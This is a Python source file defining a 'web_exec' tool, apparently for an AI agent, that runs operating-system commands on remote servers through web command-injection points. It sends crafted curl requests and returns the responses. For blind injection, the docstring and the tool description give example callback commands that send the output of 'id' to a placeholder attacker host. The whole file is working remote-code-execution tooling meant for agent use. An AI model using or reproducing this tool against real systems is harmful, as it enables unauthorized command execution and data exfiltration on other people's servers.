"""Run a command through a web command-injection primitive.

Given a request template containing a {CMD} placeholder, substitute the command
(URL-encoded by default) and fire the request via curl, returning the response.
For blind injection where the response carries no output, pair this with
oob_listener: run a command that calls back (e.g. curl http://ATTACKER/$(id|base64)).
"""
import shutil
import subprocess
from core import proc as runner
from typing import Optional, Dict
from urllib.parse import quote

from core.utils import DEFAULT_UA

BODY_CAP = 20000


def web_exec(template: str, command: str, method: str = "GET",
             headers: Optional[Dict[str, str]] = None, cookies: Optional[str] = None,
             url_encode: bool = True, timeout: int = 30) -> dict:
    if not shutil.which("curl"):
        return {"error": "curl not found in PATH"}
    if "{CMD}" not in template:
        return {"error": "template must contain the {CMD} placeholder"}

    payload = quote(command, safe="") if url_encode else command
    target = template.replace("{CMD}", payload)

    # The template may inject into the URL or the body; we treat it as the URL
    # unless it clearly looks like a body (no scheme). Callers put {CMD} where it
    # belongs and pass the full URL in `template`.
    is_url = "://" in target
    cmd = ["curl", "-s", "-k", "-X", method.upper(), "-A", DEFAULT_UA,
           "--max-time", str(timeout)]
    if headers:
        for k, v in headers.items():
            cmd += ["-H", f"{k}: {v}"]
    if cookies:
        cmd += ["-b", cookies]
    if is_url:
        cmd.append(target)
    else:
        # body injection — caller passed "URL||BODY"; split on the marker
        if "||" in target:
            url, body = target.split("||", 1)
            cmd += ["--data-raw", body, url.strip()]
        else:
            return {"error": "for body injection pass template as 'FULL_URL||BODY_WITH_{CMD}'"}

    try:
        proc = runner.run(cmd, capture_output=True, text=True, timeout=timeout + 10)
    except subprocess.TimeoutExpired:
        return {"error": "request timed out", "command": command}

    body = proc.stdout[:BODY_CAP]
    return {
        "command": command,
        "request": target if is_url else target.replace("||", "  body="),
        "response": body,
        "response_bytes": len(proc.stdout),
        "_command": f"web_exec [{method.upper()}] {command}",
    }


TOOL_DEFINITION = {
    "name": "web_exec",
    "description": (
        "Run an OS command through a web command-injection point. Provide a request `template` "
        "containing the placeholder {CMD} where the command goes (e.g. "
        "'http://host/ip?cmd={CMD}', or for a body: 'http://host/run||filter={CMD}'). The command "
        "is URL-encoded and the request is fired; the response body is returned. For BLIND "
        "injection (no output in the response), have the command call back to your oob_listener — "
        "e.g. command = 'curl http://ATTACKER:8888/$(id | base64 -w0)' — then read the decoded "
        "output with oob_listener(action='check'). This is the workhorse for driving blind RCE."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "template": {"type": "string", "description": "Request with {CMD} placeholder. URL form, or 'URL||BODY' for body injection."},
            "command": {"type": "string", "description": "The OS command to run on the target."},
            "method": {"type": "string", "description": "HTTP method (default GET)."},
            "headers": {"type": "object", "additionalProperties": {"type": "string"}, "description": "Extra request headers."},
            "cookies": {"type": "string", "description": "Cookie string for authenticated injection points."},
            "url_encode": {"type": "boolean", "description": "URL-encode the command before substituting (default true)."},
            "timeout": {"type": "integer", "description": "Request timeout seconds (default 30)."},
        },
        "required": ["template", "command"],
    },
}
